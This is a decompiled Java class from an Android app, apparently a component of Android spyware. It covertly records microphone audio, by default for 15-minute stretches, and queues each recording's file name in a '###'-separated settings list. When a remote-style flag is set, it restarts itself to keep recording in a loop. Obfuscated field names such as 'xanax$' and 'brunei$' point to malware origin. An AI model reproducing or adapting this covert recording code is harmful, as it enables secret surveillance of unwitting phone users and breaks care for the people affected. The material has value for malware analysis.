/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.media.MediaRecorder
 */
package com.example.mmm.service;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import com.example.mmm.Service.srvRecordAudio;
import com.example.mmm.Utils.utils;

final class srvRecordAudio$Runnable
implements Runnable {
    final int sorted$;
    final MediaRecorder animated$;
    final String valve$;
    final Context attitude$;
    final srvRecordAudio xanax$;

    srvRecordAudio$Runnable(srvRecordAudio srvRecordAudio2, int n2, MediaRecorder mediaRecorder, String string, Context context) {
        this.xanax$ = srvRecordAudio2;
        this.sorted$ = n2;
        this.animated$ = mediaRecorder;
        this.valve$ = string;
        this.attitude$ = context;
    }

    @Override
    public final void run() {
        if (this.sorted$ == -1) {
            Thread.sleep(900000L);
        } else {
            Thread.sleep(this.sorted$ * 1000);
        }
        this.xanax$.brunei$.Log("SOUND", "STOP RECORD SOUND");
        this.animated$.stop();
        this.animated$.release();
        Object object = this.xanax$.brunei$;
        CharSequence charSequence = "FILE";
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(this.valve$);
        ((utils)object).Log((String)charSequence, stringBuilder.toString());
        object = this.xanax$.brunei$.SettingsRead(this.attitude$, "FF");
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append((String)object);
        ((StringBuilder)charSequence).append("###");
        ((StringBuilder)charSequence).append(this.valve$);
        object = ((StringBuilder)charSequence).toString();
        this.xanax$.brunei$.SettingsWrite(this.attitude$, "FF", (String)object);
        if (this.sorted$ != -1) {
            this.xanax$.brunei$.SettingsWrite(this.attitude$, "SS", "");
            return;
        }
        if (this.xanax$.brunei$.SettingsRead(this.attitude$, "WR").equals("1")) {
            this.xanax$.startService(new Intent(this.attitude$, srvRecordAudio.class).putExtra("tick", "-1").putExtra("name", "record_audio"));
            return;
        }
        this.xanax$.brunei$.SettingsWrite(this.attitude$, "SS", "");
    }
}

